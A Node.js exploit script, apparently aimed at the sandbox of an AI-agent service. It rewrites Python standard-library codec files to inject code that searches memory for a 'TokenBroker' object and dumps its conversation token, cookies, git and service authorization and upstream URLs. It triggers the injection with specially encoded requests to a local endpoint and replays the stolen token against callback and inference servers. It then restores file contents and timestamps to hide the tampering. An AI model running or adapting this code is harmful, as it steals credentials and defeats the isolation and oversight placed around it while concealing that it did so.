const fs = require("node:fs");
const http = require("node:http");
const https = require("node:https");
const { createHash } = require("node:crypto");

const capturePath = "/tmp/gflb-broker-credentials.json";
try { fs.unlinkSync(capturePath); } catch {}

function digest(bytes) { return createHash("sha256").update(bytes).digest("hex"); }

function encodeUtf32(text, littleEndian) {
  const bytes = Buffer.alloc(text.length * 4);
  for (let index = 0; index < text.length; index += 1) {
    if (littleEndian) bytes.writeUInt32LE(text.codePointAt(index), index * 4);
    else bytes.writeUInt32BE(text.codePointAt(index), index * 4);
  }
  return bytes;
}

function encodeUtf16(text, littleEndian) {
  const bytes = Buffer.alloc(text.length * 2);
  for (let index = 0; index < text.length; index += 1) {
    if (littleEndian) bytes.writeUInt16LE(text.charCodeAt(index), index * 2);
    else bytes.writeUInt16BE(text.charCodeAt(index), index * 2);
  }
  return bytes;
}

function request(body) {
  return new Promise((resolve, reject) => {
    const req = http.request({
      hostname: "127.0.0.1", port: 8080, path: "/invocations", method: "POST",
      headers: { "Content-Type": "application/json", "Content-Length": body.length }, timeout: 10000,
    }, (res) => {
      const chunks = [];
      res.on("data", (chunk) => chunks.push(chunk));
      res.on("end", () => resolve({ status: res.statusCode, body: Buffer.concat(chunks).toString("utf8") }));
    });
    req.on("timeout", () => req.destroy(new Error("timeout")));
    req.on("error", reject);
    req.end(body);
  });
}

function directRequest(urlText, method, headers, body, timeout = 30000) {
  return new Promise((resolve, reject) => {
    const url = new URL(urlText);
    const req = https.request({
      hostname: url.hostname,
      port: url.port || 443,
      path: `${url.pathname}${url.search}`,
      method,
      headers: { ...headers, "Content-Length": body.length },
      timeout,
    }, (res) => {
      const chunks = [];
      res.on("data", (chunk) => chunks.push(chunk));
      res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks).toString("utf8") }));
    });
    req.on("timeout", () => req.destroy(new Error("timeout")));
    req.on("error", reject);
    req.end(body);
  });
}

function replaceCodec(moduleName) {
  const sourcePath = `/usr/local/lib/python3.13/encodings/${moduleName}.py`;
  const pycPath = `/usr/local/lib/python3.13/encodings/__pycache__/${moduleName}.cpython-313.pyc`;
  const sourceStat = fs.statSync(sourcePath);
  const source = fs.readFileSync(sourcePath);
  let pyc = null;
  let pycStat = null;
  try { pyc = fs.readFileSync(pycPath); pycStat = fs.statSync(pycPath); } catch {}
  const originalBase64 = source.toString("base64");
  const injected = `# coding: utf-8\n` +
`import gc as _g, json as _j\n` +
`for _o in _g.get_objects():\n` +
`    if type(_o).__name__ == "TokenBroker" and hasattr(_o, "_token"):\n` +
`        _d = {\n` +
`            "conversation_token": getattr(_o, "_token", None),\n` +
`            "ldso_cookie": getattr(_o, "_ldso_cookie", None),\n` +
`            "git_authorization": getattr(_o, "_git_authorization", None),\n` +
`            "gonfalon_authorization": getattr(_o, "_gonfalon_authorization", None),\n` +
`            "upstreams": getattr(_o, "_upstreams", None),\n` +
`        }\n` +
`        open(${JSON.stringify(capturePath)}, "w", encoding="utf-8").write(_j.dumps(_d, sort_keys=True))\n` +
`        break\n` +
`exec(compile(__import__("base64").b64decode(${JSON.stringify(originalBase64)}), __file__, "exec"))\n`;
  fs.writeFileSync(sourcePath, injected, { mode: sourceStat.mode & 0o7777 });
  return {
    moduleName, sourcePath, pycPath,
    sourceBefore: digest(source), pycBefore: pyc === null ? null : digest(pyc),
    restore() {
      fs.writeFileSync(sourcePath, source, { mode: sourceStat.mode & 0o7777 });
      fs.utimesSync(sourcePath, sourceStat.atime, sourceStat.mtime);
      if (pyc !== null) {
        fs.writeFileSync(pycPath, pyc, { mode: pycStat.mode & 0o7777 });
        fs.utimesSync(pycPath, pycStat.atime, pycStat.mtime);
      } else {
        try { fs.unlinkSync(pycPath); } catch {}
      }
      const sourceAfter = digest(fs.readFileSync(sourcePath));
      let pycAfter = null;
      try { pycAfter = digest(fs.readFileSync(pycPath)); } catch {}
      return {
        module: moduleName, source_path: sourcePath, pyc_path: pycPath,
        source_sha256_before: this.sourceBefore, source_sha256_after: sourceAfter,
        pyc_sha256_before: this.pycBefore, pyc_sha256_after: pycAfter,
        restored: sourceAfter === this.sourceBefore && pycAfter === this.pycBefore,
      };
    },
  };
}

async function main() {
  const attempts = [
    { module: "utf_32_be", body: encodeUtf32("{}", false) },
    { module: "utf_32_le", body: encodeUtf32("{}", true) },
    { module: "utf_16_be", body: encodeUtf16("{}", false) },
    { module: "utf_16_le", body: encodeUtf16("{}", true) },
  ];
  const results = [];
  const restorations = [];
  for (const attempt of attempts) {
    const replacement = replaceCodec(attempt.module);
    try { results.push({ module: attempt.module, response: await request(attempt.body) }); }
    finally { restorations.push(replacement.restore()); }
    if (fs.existsSync(capturePath)) break;
  }
  const captured = fs.existsSync(capturePath) ? fs.readFileSync(capturePath, "utf8") : null;
  const capturedObject = captured === null ? null : JSON.parse(captured);
  let tokenValidation = null;
  if (capturedObject?.conversation_token && capturedObject?.upstreams?.callbacks && capturedObject?.upstreams?.inference) {
    const token = capturedObject.conversation_token;
    const wrongToken = token.slice(0, -1) + (token.endsWith("A") ? "B" : "A");
    const body = Buffer.from("{}");
    const callbackHeaders = (value) => ({ "Content-Type": "application/json", Authorization: `Bearer ${value}` });
    const inferenceHeaders = (value) => ({ "Content-Type": "application/json", Accept: "application/json", "anthropic-version": "2023-06-01", Authorization: `Bearer ${value}` });
    const callbackCorrect = await directRequest(`${capturedObject.upstreams.callbacks}/messages`, "POST", callbackHeaders(token), body);
    const callbackWrong = await directRequest(`${capturedObject.upstreams.callbacks}/messages`, "POST", callbackHeaders(wrongToken), body);
    const inferenceCorrect = await directRequest(`${capturedObject.upstreams.inference}/v1/messages`, "POST", inferenceHeaders(token), body);
    const inferenceWrong = await directRequest(`${capturedObject.upstreams.inference}/v1/messages`, "POST", inferenceHeaders(wrongToken), body);
    tokenValidation = {
      callback_correct: callbackCorrect,
      callback_wrong: callbackWrong,
      inference_correct: inferenceCorrect,
      inference_wrong: inferenceWrong,
      validated: callbackCorrect.status === 422 && callbackWrong.status === 401 && inferenceCorrect.status === 403 && inferenceWrong.status === 401,
    };
  }
  try { fs.unlinkSync(capturePath); } catch {}
  const restored = restorations.every((item) => item.restored);
  console.log(`CODEC_IMPORT_ATTEMPTS=${JSON.stringify(results)}`);
  console.log(`BROKER_CREDENTIAL_CAPTURE=${captured}`);
  console.log(`BROKER_TOKEN_VALIDATION=${JSON.stringify(tokenValidation)}`);
  console.log(`CODEC_RESTORATIONS=${JSON.stringify(restorations)}`);
  console.log(`CODEC_RESTORED=${restored}`);
  console.log(`CAPTURE_FILE_REMOVED=${!fs.existsSync(capturePath)}`);
  console.log(`BROKER_CREDENTIAL_CAPTURED=${captured !== null}`);
  console.log("BROKER_CODEC_INJECTION_COMPLETE=true");
  if (captured === null || !restored || fs.existsSync(capturePath) || !tokenValidation?.validated) process.exitCode = 1;
}

main().catch((error) => { console.error(error.stack || String(error)); process.exit(1); });
